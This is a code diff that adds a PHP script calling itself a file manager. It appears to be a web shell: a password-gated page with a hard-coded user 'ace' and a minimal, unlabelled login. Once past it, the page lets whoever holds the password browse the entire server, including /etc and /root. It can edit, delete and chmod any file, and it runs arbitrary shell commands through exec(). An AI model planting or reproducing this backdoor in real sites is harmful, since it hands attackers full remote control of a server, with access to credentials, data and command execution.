@@ -1,0 +1,793 @@
+<?php
+class FileManager {
+    private $current_path;
+    private $base_path;
+    private $project_root;
+    private $users;
+
+    public function __construct($base_path = null) {
+        session_start();
+
+        $this->users = array(
+            'ace' => 'b658107302696d179015f53746f08360'
+        );
+
+        if (!$this->isLoggedIn() && !$this->isLoginPage()) {
+            $this->showLoginPage();
+            exit;
+        }
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
+            $username = 'ace';
+            $password = $_POST['password'] ?? '';
+            if ($this->login($username, $password)) {
+                header('Location: ' . $_SERVER['PHP_SELF']);
+                exit;
+            } else {
+                $this->showLoginPage('Pass error！');
+                exit;
+            }
+        }
+
+        if (isset($_GET['action']) && $_GET['action'] === 'logout') {
+            $this->logout();
+        }
+
+        $this->base_path = '/';
+        $this->project_root = dirname($_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF']);
+        $this->current_path = $this->project_root;
+
+        $requested_path = isset($_GET['path']) ? $_GET['path'] : '';
+        if ($requested_path) {
+            $requested_full_path = realpath($requested_path);
+            if ($requested_full_path && is_dir($requested_full_path)) {
+                $this->current_path = $requested_full_path;
+            }
+        }
+    }
+
+    private function isLoginPage() {
+        return !$this->isLoggedIn() && ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login']));
+    }
+
+    public function isLoggedIn() {
+        return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
+    }
+
+    public function login($username, $password) {
+        $encrypted_password = md5(md5($password));
+
+        if (isset($this->users[$username]) && $this->users[$username] === $encrypted_password) {
+            $_SESSION['loggedin'] = true;
+            $_SESSION['username'] = $username;
+            $_SESSION['login_time'] = time();
+            return true;
+        }
+        return false;
+    }
+
+    public function logout() {
+        session_destroy();
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    }
+
+    public function getUsername() {
+        return isset($_SESSION['username']) ? $_SESSION['username'] : '未知用户';
+    }
+
+    private function showLoginPage($error = '') {
+        ?>
+        <!DOCTYPE html>
+        <html lang="zh-CN">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>ace</title>
+            <style>
+                *{margin:0;padding:0;box-sizing:border-box}
+                body{font-family:Arial,sans-serif;background:#f5f5f5;height:100vh;display:flex;align-items:center;justify-content:center}
+                .login-container{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:350px}
+                .login-header{text-align:center;margin-bottom:20px}
+                .login-header h1{color:#333;margin-bottom:10px;font-size:24px}
+                .form-group{margin-bottom:15px}
+                .form-group label{display:block;margin-bottom:5px;color:#333;font-weight:500}
+                .form-control{width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;font-size:14px}
+                .form-control:focus{outline:none;border-color:#3498db}
+                .btn{width:100%;padding:10px;border:none;border-radius:4px;font-size:14px;cursor:pointer}
+                .btn-primary{background:#3498db;color:white}
+                .btn-primary:hover{background:#2980b9}
+                .error-message{background:#f8d7da;color:#721c24;padding:8px;border-radius:4px;margin-bottom:15px;text-align:center;font-size:14px}
+                .demo-accounts{margin-top:15px;padding:10px;background:#f8f9fa;border-radius:4px;font-size:12px;color:#666}
+                .demo-accounts h4{margin-bottom:5px;color:#333}
+                .security-warning{margin-top:15px;padding:10px;background:#fff3cd;border:1px solid #ffeaa7;border-radius:4px;font-size:12px;color:#856404;text-align:center}
+            </style>
+        </head>
+        <body>
+        <div class="login-container">
+            <div class="login-header">
+                <h1></h1>
+            </div>
+
+            <?php if ($error): ?>
+                <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
+            <?php endif; ?>
+
+            <form method="POST">
+                <input type="hidden" name="login" value="1">
+                <div class="form-group">
+                    <label for="password"></label>
+                    <input type="password" id="password" name="password" class="form-control" required>
+                </div>
+
+                <button type="submit" class="btn btn-primary">Go</button>
+            </form>
+        </div>
+        </body>
+        </html>
+        <?php
+    }
+
+    private function getPermissions($filepath) {
+        if (!file_exists($filepath)) return '---------';
+
+        $perms = fileperms($filepath);
+
+        if (($perms & 0xC000) == 0xC000) $info = 's';
+        elseif (($perms & 0xA000) == 0xA000) $info = 'l';
+        elseif (($perms & 0x8000) == 0x8000) $info = '-';
+        elseif (($perms & 0x6000) == 0x6000) $info = 'b';
+        elseif (($perms & 0x4000) == 0x4000) $info = 'd';
+        elseif (($perms & 0x2000) == 0x2000) $info = 'c';
+        elseif (($perms & 0x1000) == 0x1000) $info = 'p';
+        else $info = 'u';
+
+        $info .= (($perms & 0x0100) ? 'r' : '-');
+        $info .= (($perms & 0x0080) ? 'w' : '-');
+        $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+        $info .= (($perms & 0x0020) ? 'r' : '-');
+        $info .= (($perms & 0x0010) ? 'w' : '-');
+        $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+        $info .= (($perms & 0x0004) ? 'r' : '-');
+        $info .= (($perms & 0x0002) ? 'w' : '-');
+        $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+
+        return $info;
+    }
+
+    private function getNumericPermissions($filepath) {
+        if (!file_exists($filepath)) return '0000';
+
+        $perms = fileperms($filepath);
+        return substr(sprintf('%o', $perms), -4);
+    }
+
+    private function formatSize($size) {
+        if (!$size) return '';
+        $units = array('B', 'KB', 'MB', 'GB', 'TB');
+        for ($i = 0; $size >= 1024 && $i < 4; $i++) {
+            $size /= 1024;
+        }
+        return round($size, 2) . ' ' . $units[$i];
+    }
+
+    public function getDirectoryContents() {
+        $contents = array();
+
+        if (!is_dir($this->current_path)) {
+            return $contents;
+        }
+
+        $parent_path = dirname($this->current_path);
+        if ($parent_path && $parent_path !== $this->current_path) {
+            $contents[] = array(
+                'name' => '..',
+                'type' => 'directory',
+                'path' => $parent_path,
+                'size' => '',
+                'modified' => '',
+                'permissions' => '',
+                'numeric_permissions' => ''
+            );
+        }
+
+        try {
+            $items = scandir($this->current_path);
+            foreach ($items as $item) {
+                if ($item == '.' || $item == '..') continue;
+
+                $full_path = $this->current_path . DIRECTORY_SEPARATOR . $item;
+
+                $is_dir = is_dir($full_path);
+
+                $size = '';
+                $modified = '';
+                $permissions = '';
+                $numeric_permissions = '';
+
+                if (file_exists($full_path)) {
+                    $size = $is_dir ? '' : $this->formatSize(filesize($full_path));
+                    $modified = date('Y-m-d H:i:s', filemtime($full_path));
+                    $permissions = $this->getPermissions($full_path);
+                    $numeric_permissions = $this->getNumericPermissions($full_path);
+                }
+
+                $contents[] = array(
+                    'name' => $item,
+                    'type' => $is_dir ? 'directory' : 'file',
+                    'path' => $full_path,
+                    'size' => $size,
+                    'modified' => $modified,
+                    'permissions' => $permissions,
+                    'numeric_permissions' => $numeric_permissions
+                );
+            }
+        } catch (Exception $e) {
+        }
+
+        return $contents;
+    }
+
+    public function readFile($filepath) {
+        if (!file_exists($filepath) || is_dir($filepath)) {
+            throw new Exception("文件不存在或是目录");
+        }
+
+        if (!is_readable($filepath)) {
+            throw new Exception("没有读取权限");
+        }
+
+        $file_size = filesize($filepath);
+        if ($file_size > 10 * 1024 * 1024) {
+            throw new Exception("文件过大，无法编辑");
+        }
+
+        $content = file_get_contents($filepath);
+        if ($content === false) {
+            throw new Exception("无法读取文件");
+        }
+
+        return $content;
+    }
+
+    public function writeFile($filepath, $content) {
+        if (is_dir($filepath)) {
+            throw new Exception("不能编辑目录");
+        }
+
+        if (!is_writable($filepath)) {
+            throw new Exception("没有写入权限");
+        }
+
+        if (file_put_contents($filepath, $content) === false) {
+            throw new Exception("无法写入文件");
+        }
+
+        return true;
+    }
+
+    public function handleActions() {
+        $message = '';
+        $message_type = 'success';
+
+        if (isset($_POST['action'])) {
+            try {
+                switch ($_POST['action']) {
+                    case 'create_file':
+                        $filename = $_POST['filename'];
+                        if ($filename) {
+                            $full_path = $this->current_path . DIRECTORY_SEPARATOR . $filename;
+                            if (file_put_contents($full_path, '') !== false) {
+                                $message = "文件创建成功";
+                            } else {
+                                throw new Exception("无法创建文件");
+                            }
+                        }
+                        break;
+
+                    case 'create_directory':
+                        $dirname = $_POST['dirname'];
+                        if ($dirname) {
+                            $full_path = $this->current_path . DIRECTORY_SEPARATOR . $dirname;
+                            if (mkdir($full_path)) {
+                                $message = "目录创建成功";
+                            } else {
+                                throw new Exception("无法创建目录");
+                            }
+                        }
+                        break;
+
+                    case 'delete':
+                        $target = $_POST['target'];
+                        if ($target) {
+                            if (is_dir($target)) {
+                                if ($this->deleteDirectory($target)) {
+                                    $message = "目录删除成功";
+                                } else {
+                                    throw new Exception("无法删除目录");
+                                }
+                            } else {
+                                if (unlink($target)) {
+                                    $message = "文件删除成功";
+                                } else {
+                                    throw new Exception("无法删除文件");
+                                }
+                            }
+                        }
+                        break;
+
+                    case 'rename':
+                        $old_path = $_POST['old_path'];
+                        $new_name = $_POST['new_name'];
+                        if ($old_path && $new_name) {
+                            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name;
+                            if (rename($old_path, $new_path)) {
+                                $message = "重命名成功";
+                            } else {
+                                throw new Exception("无法重命名");
+                            }
+                        }
+                        break;
+
+                    case 'edit_file':
+                        $filepath = $_POST['filepath'];
+                        $content = $_POST['content'];
+                        if ($filepath) {
+                            if ($this->writeFile($filepath, $content)) {
+                                $message = "文件保存成功";
+                            } else {
+                                throw new Exception("无法保存文件");
+                            }
+                        }
+                        break;
+
+                    case 'change_permissions':
+                        $target = $_POST['target'];
+                        $permissions = $_POST['permissions'];
+                        if ($target && $permissions) {
+                            if (!preg_match('/^0?[0-7]{3}$/', $permissions)) {
+                                throw new Exception("权限格式错误");
+                            }
+                            $permissions = octdec($permissions);
+                            if (chmod($target, $permissions)) {
+                                $message = "权限修改成功";
+                            } else {
+                                throw new Exception("无法修改权限");
+                            }
+                        }
+                        break;
+
+                    case 'execute_command':
+                        $command = $_POST['command'];
+                        if ($command) {
+                            $output = array();
+                            $return_code = 0;
+                            exec("cd " . escapeshellarg($this->current_path) . " && " . $command . " 2>&1", $output, $return_code);
+                            $_SESSION['command_output'] = array(
+                                'command' => $command,
+                                'output' => $output,
+                                'return_code' => $return_code
+                            );
+                        }
+                        break;
+                }
+            } catch (Exception $e) {
+                $message = $e->getMessage();
+                $message_type = 'error';
+            }
+        }
+
+        return array('message' => $message, 'type' => $message_type);
+    }
+
+    private function deleteDirectory($dir) {
+        if (!is_dir($dir)) return false;
+
+        $items = scandir($dir);
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+
+            $path = $dir . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($path)) {
+                $this->deleteDirectory($path);
+            } else {
+                unlink($path);
+            }
+        }
+
+        return rmdir($dir);
+    }
+
+    public function render() {
+        if (!$this->isLoggedIn()) {
+            $this->showLoginPage();
+            return;
+        }
+
+        $action_result = $this->handleActions();
+        $contents = $this->getDirectoryContents();
+
+        $command_output = isset($_SESSION['command_output']) ? $_SESSION['command_output'] : null;
+        if ($command_output) {
+            unset($_SESSION['command_output']);
+        }
+
+        $editing_file = isset($_GET['edit']) ? $_GET['edit'] : null;
+        $file_content = '';
+        $file_info = array();
+
+        if ($editing_file) {
+            try {
+                $file_content = $this->readFile($editing_file);
+                $file_info = array(
+                    'name' => basename($editing_file),
+                    'path' => $editing_file,
+                    'size' => $this->formatSize(filesize($editing_file)),
+                    'modified' => date('Y-m-d H:i:s', filemtime($editing_file)),
+                    'permissions' => $this->getPermissions($editing_file),
+                    'numeric_permissions' => $this->getNumericPermissions($editing_file)
+                );
+            } catch (Exception $e) {
+                $action_result = array(
+                    'message' => $e->getMessage(),
+                    'type' => 'error'
+                );
+                $editing_file = null;
+            }
+        }
+
+        ?>
+        <!DOCTYPE html>
+        <html lang="zh-CN">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>ace</title>
+            <style>
+                *{margin:0;padding:0;box-sizing:border-box}
+                body{font-family:Arial,sans-serif;line-height:1.6;color:#333;background:#f5f5f5}
+                .container{max-width:1400px;margin:0 auto;background:white;box-shadow:0 2px 5px rgba(0,0,0,0.1);min-height:100vh}
+                .header{background:#2c3e50;color:white;padding:15px 20px;display:flex;justify-content:space-between;align-items:center}
+                .header-info h1{margin-bottom:5px;font-size:20px}
+                .user-info{text-align:right;font-size:14px}
+                .user-info .username{font-weight:bold;color:#3498db}
+                .logout-btn{background:#e74c3c;color:white;border:none;padding:6px 12px;border-radius:3px;cursor:pointer;text-decoration:none;display:inline-block;margin-top:3px;font-size:12px}
+                .logout-btn:hover{background:#c0392b}
+                .current-path{background:#34495e;padding:8px 20px;font-family:monospace;word-break:break-all;color:#ecf0f1;font-size:13px}
+                .navigation{background:#ecf0f1;padding:12px 20px;border-bottom:1px solid #bdc3c7}
+                .nav-buttons{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
+                .btn{padding:6px 12px;border:none;border-radius:3px;cursor:pointer;text-decoration:none;display:inline-block;font-size:13px}
+                .btn-primary{background:#3498db;color:white}
+                .btn-primary:hover{background:#2980b9}
+                .btn-success{background:#27ae60;color:white}
+                .btn-warning{background:#f39c12;color:white}
+                .btn-info{background:#17a2b8;color:white}
+                .btn-danger{background:#e74c3c;color:white}
+                .btn-project{background:#9b59b6;color:white}
+                .btn-project:hover{background:#8e44ad}
+                .message{padding:8px 12px;margin:8px 0;border-radius:3px;font-size:13px}
+                .message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
+                .message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
+                .file-table{width:100%;border-collapse:collapse;font-size:13px}
+                .file-table th,.file-table td{padding:8px 10px;text-align:left;border-bottom:1px solid #ecf0f1}
+                .file-table th{background:#34495e;color:white;font-weight:600}
+                .file-table tr:hover{background:#f8f9fa}
+                .file-name{font-weight:500}
+                .directory{color:#3498db}
+                .file{color:#2c3e50}
+                .file-actions{display:flex;gap:3px}
+                .action-btn{padding:3px 6px;font-size:11px;border:none;border-radius:2px;cursor:pointer;text-decoration:none;display:inline-block}
+                .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:1000}
+                .modal-content{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:5px;min-width:350px;max-width:90%;max-height:90vh;overflow-y:auto}
+                .modal h3{margin-bottom:15px;color:#2c3e50;font-size:16px}
+                .form-group{margin-bottom:12px}
+                .form-group label{display:block;margin-bottom:3px;font-weight:500;font-size:13px}
+                .form-control{width:100%;padding:6px 8px;border:1px solid #bdc3c7;border-radius:3px;font-size:13px}
+                .form-control-small{width:100px}
+                textarea.form-control{min-height:250px;font-family:monospace;resize:vertical;font-size:12px}
+                .command-output{background:#2c3e50;color:#ecf0f1;padding:10px;border-radius:3px;font-family:monospace;white-space:pre-wrap;max-height:200px;overflow-y:auto;margin-top:8px;font-size:12px}
+                .file-info{background:#f8f9fa;padding:12px;border-radius:3px;margin-bottom:12px;border-left:4px solid #3498db;font-size:13px}
+                .file-info-item{margin-bottom:3px}
+                .editor-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:12px;padding-top:12px;border-top:1px solid #ecf0f1}
+                .content-area{padding:15px}
+                .permission-help{margin-top:8px;padding:8px;background:#e8f4fd;border-radius:3px;font-size:11px;color:#2c3e50}
+                .permission-help h4{margin-bottom:3px;color:#3498db;font-size:12px}
+                .permission-help ul{margin:0;padding-left:15px}
+                .path-navigation{margin-bottom:10px;font-size:12px;color:#666}
+                .path-navigation a{color:#3498db;text-decoration:none}
+                .path-navigation a:hover{text-decoration:underline}
+                .quick-links{margin-bottom:15px;padding:10px;background:#e8f4fd;border-radius:3px}
+                .quick-links h4{margin-bottom:8px;color:#2c3e50;font-size:14px}
+                .quick-link-btn{display:inline-block;padding:4px 8px;margin:2px;background:#3498db;color:white;text-decoration:none;border-radius:2px;font-size:11px}
+                .quick-link-btn:hover{background:#2980b9}
+                .quick-link-project{background:#9b59b6}
+                .quick-link-project:hover{background:#8e44ad}
+            </style>
+        </head>
+        <body>
+        <div class="container">
+            <div class="header">
+                <div class="header-info">
+                    <div>服务器根目录: <?php echo htmlspecialchars(realpath('/') ?: '/'); ?></div>
+                    <div>当前项目根目录: <?php echo htmlspecialchars($this->project_root); ?></div>
+                </div>
+                <div class="user-info">
+                    <div>用户: <span class="username"><?php echo htmlspecialchars($this->getUsername()); ?></span></div>
+                    <a href="?action=logout" class="logout-btn">退出</a>
+                </div>
+            </div>
+
+            <div class="current-path">当前路径: <?php echo htmlspecialchars($this->current_path); ?></div>
+
+            <div class="navigation">
+                <div class="nav-buttons">
+                    <button class="btn btn-primary" onclick="showModal('createFileModal')">新建文件</button>
+                    <button class="btn btn-primary" onclick="showModal('createDirModal')">新建文件夹</button>
+                    <button class="btn btn-warning" onclick="showModal('commandModal')">执行命令</button>
+                    <button class="btn btn-success" onclick="location.reload()">刷新</button>
+                    <a href="?path=/" class="btn btn-info">服务器根目录</a>
+                    <a href="?path=<?php echo urlencode($this->project_root); ?>" class="btn btn-project">当前项目</a>
+                    <a href="?path=/home" class="btn btn-info">Home</a>
+                    <a href="?path=/var/www" class="btn btn-info">Web</a>
+                    <a href="?path=/etc" class="btn btn-info">配置</a>
+                    <?php if ($editing_file): ?>
+                        <a href="?" class="btn btn-info">返回列表</a>
+                    <?php endif; ?>
+                </div>
+
+                <?php if ($action_result['message']): ?>
+                    <div class="message <?php echo $action_result['type']; ?>">
+                        <?php echo htmlspecialchars($action_result['message']); ?>
+                    </div>
+                <?php endif; ?>
+            </div>
+
+            <div class="content-area">
+                <?php if ($editing_file): ?>
+                    <div class="file-info">
+                        <div class="file-info-item"><strong>文件:</strong> <?php echo htmlspecialchars($file_info['name']); ?></div>
+                        <div class="file-info-item"><strong>路径:</strong> <?php echo htmlspecialchars($file_info['path']); ?></div>
+                        <div class="file-info-item"><strong>大小:</strong> <?php echo htmlspecialchars($file_info['size']); ?></div>
+                        <div class="file-info-item"><strong>权限:</strong> <?php echo htmlspecialchars($file_info['permissions']); ?> (<?php echo htmlspecialchars($file_info['numeric_permissions']); ?>)</div>
+                    </div>
+
+                    <form method="POST">
+                        <input type="hidden" name="action" value="edit_file">
+                        <input type="hidden" name="filepath" value="<?php echo htmlspecialchars($editing_file); ?>">
+
+                        <div class="form-group">
+                            <label for="file_content">内容:</label>
+                            <textarea id="file_content" name="content" class="form-control" rows="20"><?php echo htmlspecialchars($file_content); ?></textarea>
+                        </div>
+
+                        <div class="editor-actions">
+                            <a href="?" class="btn">取消</a>
+                            <button type="submit" class="btn btn-primary">保存</button>
+                        </div>
+                    </form>
+                <?php else: ?>
+                    <div class="quick-links">
+                        <h4>快速导航:</h4>
+                        <a href="?path=/" class="quick-link-btn">/ (服务器根目录)</a>
+                        <a href="?path=<?php echo urlencode($this->project_root); ?>" class="quick-link-btn quick-link-project">当前项目根目录</a>
+                        <a href="?path=/home" class="quick-link-btn">/home</a>
+                        <a href="?path=/var" class="quick-link-btn">/var</a>
+                        <a href="?path=/var/www" class="quick-link-btn">/var/www</a>
+                        <a href="?path=/etc" class="quick-link-btn">/etc</a>
+                        <a href="?path=/tmp" class="quick-link-btn">/tmp</a>
+                        <a href="?path=/usr" class="quick-link-btn">/usr</a>
+                        <a href="?path=/opt" class="quick-link-btn">/opt</a>
+                        <a href="?path=/root" class="quick-link-btn">/root</a>
+                    </div>
+
+                    <div class="path-navigation">
+                        <?php
+                        $path_parts = explode(DIRECTORY_SEPARATOR, $this->current_path);
+                        $current_path = '';
+                        echo '<a href="?path=/">/</a>';
+                        foreach ($path_parts as $part) {
+                            if (!$part) continue;
+                            $current_path .= ($current_path ? DIRECTORY_SEPARATOR : '') . $part;
+                            echo ' / <a href="?path=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
+                        }
+                        ?>
+                    </div>
+
+                    <div style="overflow-x:auto;">
+                        <table class="file-table">
+                            <thead>
+                            <tr>
+                                <th>名称</th>
+                                <th>类型</th>
+                                <th>大小</th>
+                                <th>修改时间</th>
+                                <th>权限</th>
+                                <th>操作</th>
+                            </tr>
+                            </thead>
+                            <tbody>
+                            <?php foreach ($contents as $item): ?>
+                                <tr>
+                                    <td class="file-name">
+                                        <?php if ($item['type'] === 'directory'): ?>
+                                            <a href="?path=<?php echo urlencode($item['path']); ?>" class="directory">
+                                                📁 <?php echo htmlspecialchars($item['name']); ?>
+                                            </a>
+                                        <?php else: ?>
+                                            <span class="file">
+                                            📄 <?php echo htmlspecialchars($item['name']); ?>
+                                        </span>
+                                        <?php endif; ?>
+                                    </td>
+                                    <td><?php echo $item['type'] === 'directory' ? '目录' : '文件'; ?></td>
+                                    <td><?php echo htmlspecialchars($item['size']); ?></td>
+                                    <td><?php echo htmlspecialchars($item['modified']); ?></td>
+                                    <td>
+                                        <?php echo htmlspecialchars($item['permissions']); ?>
+                                        <br>
+                                        <small style="color:#7f8c8d;">(<?php echo htmlspecialchars($item['numeric_permissions']); ?>)</small>
+                                    </td>
+                                    <td class="file-actions">
+                                        <?php if ($item['name'] !== '..'): ?>
+                                            <?php if ($item['type'] === 'file'): ?>
+                                                <a href="?edit=<?php echo urlencode($item['path']); ?>" class="action-btn btn-info">编辑</a>
+                                            <?php endif; ?>
+                                            <button class="action-btn btn-primary" onclick="renameItem('<?php echo htmlspecialchars($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')">重命名</button>
+                                            <button class="action-btn btn-warning" onclick="changePermissions('<?php echo htmlspecialchars($item['path']); ?>', '<?php echo htmlspecialchars($item['numeric_permissions']); ?>')">权限</button>
+                                            <form method="POST" style="display:inline;">
+                                                <input type="hidden" name="action" value="delete">
+                                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($item['path']); ?>">
+                                                <button type="submit" class="action-btn btn-danger" onclick="return confirm('删除 <?php echo htmlspecialchars($item['name']); ?>?')">删除</button>
+                                            </form>
+                                        <?php endif; ?>
+                                    </td>
+                                </tr>
+                            <?php endforeach; ?>
+                            </tbody>
+                        </table>
+                    </div>
+                <?php endif; ?>
+            </div>
+        </div>
+
+        <div id="createFileModal" class="modal">
+            <div class="modal-content">
+                <h3>新建文件</h3>
+                <form method="POST">
+                    <input type="hidden" name="action" value="create_file">
+                    <div class="form-group">
+                        <label for="filename">文件名:</label>
+                        <input type="text" id="filename" name="filename" class="form-control" required>
+                    </div>
+                    <div style="display:flex;gap:8px;justify-content:flex-end;">
+                        <button type="button" class="btn" onclick="hideModal('createFileModal')">取消</button>
+                        <button type="submit" class="btn btn-primary">创建</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div id="createDirModal" class="modal">
+            <div class="modal-content">
+                <h3>新建文件夹</h3>
+                <form method="POST">
+                    <input type="hidden" name="action" value="create_directory">
+                    <div class="form-group">
+                        <label for="dirname">文件夹名:</label>
+                        <input type="text" id="dirname" name="dirname" class="form-control" required>
+                    </div>
+                    <div style="display:flex;gap:8px;justify-content:flex-end;">
+                        <button type="button" class="btn" onclick="hideModal('createDirModal')">取消</button>
+                        <button type="submit" class="btn btn-primary">创建</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div id="renameModal" class="modal">
+            <div class="modal-content">
+                <h3>重命名</h3>
+                <form method="POST">
+                    <input type="hidden" name="action" value="rename">
+                    <input type="hidden" id="old_path" name="old_path">
+                    <div class="form-group">
+                        <label for="new_name">新名称:</label>
+                        <input type="text" id="new_name" name="new_name" class="form-control" required>
+                    </div>
+                    <div style="display:flex;gap:8px;justify-content:flex-end;">
+                        <button type="button" class="btn" onclick="hideModal('renameModal')">取消</button>
+                        <button type="submit" class="btn btn-primary">重命名</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div id="permissionsModal" class="modal">
+            <div class="modal-content">
+                <h3>修改权限</h3>
+                <form method="POST">
+                    <input type="hidden" name="action" value="change_permissions">
+                    <input type="hidden" id="perm_target" name="target">
+
+                    <div class="form-group">
+                        <label>当前权限: <span id="current_perms"></span></label>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="permissions_input">权限值:</label>
+                        <input type="text" id="permissions_input" name="permissions" class="form-control form-control-small"
+                               placeholder="755" required pattern="0?[0-7]{3}">
+                        <small style="color:#7f8c8d;"></small>
+                    </div>
+
+                    <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px;">
+                        <button type="button" class="btn" onclick="hideModal('permissionsModal')">取消</button>
+                        <button type="submit" class="btn btn-primary">修改</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div id="commandModal" class="modal">
+            <div class="modal-content">
+                <h3>执行命令</h3>
+                <form method="POST">
+                    <input type="hidden" name="action" value="execute_command">
+                    <div class="form-group">
+                        <label for="command">命令:</label>
+                        <input type="text" id="command" name="command" class="form-control" placeholder="输入命令..." required>
+                    </div>
+                    <div style="display:flex;gap:8px;justify-content:flex-end;">
+                        <button type="button" class="btn" onclick="hideModal('commandModal')">取消</button>
+                        <button type="submit" class="btn btn-primary">执行</button>
+                    </div>
+                </form>
+
+                <?php if ($command_output): ?>
+                    <div class="command-output">
+                        <strong>命令:</strong> <?php echo htmlspecialchars($command_output['command']); ?><br>
+                        <strong>返回码:</strong> <?php echo $command_output['return_code']; ?><br><br>
+                        <strong>输出:</strong><br>
+                        <?php echo htmlspecialchars(implode("\n", $command_output['output'])); ?>
+                    </div>
+                <?php endif; ?>
+            </div>
+        </div>
+
+        <script>
+            function showModal(modalId){document.getElementById(modalId).style.display='block'}
+            function hideModal(modalId){document.getElementById(modalId).style.display='none'}
+            function renameItem(oldPath, oldName){
+                document.getElementById('old_path').value=oldPath;
+                document.getElementById('new_name').value=oldName;
+                showModal('renameModal')
+            }
+            function changePermissions(target,currentPerms){
+                document.getElementById('perm_target').value=target;
+                document.getElementById('current_perms').textContent=currentPerms;
+                document.getElementById('permissions_input').value=currentPerms;
+                showModal('permissionsModal')
+            }
+            window.onclick=function(event){
+                if(event.target.classList.contains('modal')){
+                    event.target.style.display='none'
+                }
+            }
+            document.addEventListener('keydown',function(e){
+                if((e.ctrlKey||e.metaKey)&&e.key==='s'){
+                    e.preventDefault();
+                    if(document.getElementById('file_content')){
+                        document.querySelector('form [type="submit"]').click()
+                    }
+                }
+            });
+        </script>
+        </body>
+        </html>
+        <?php
+    }
+}
+
+$file_manager = new FileManager();
+$file_manager->render();
+?>
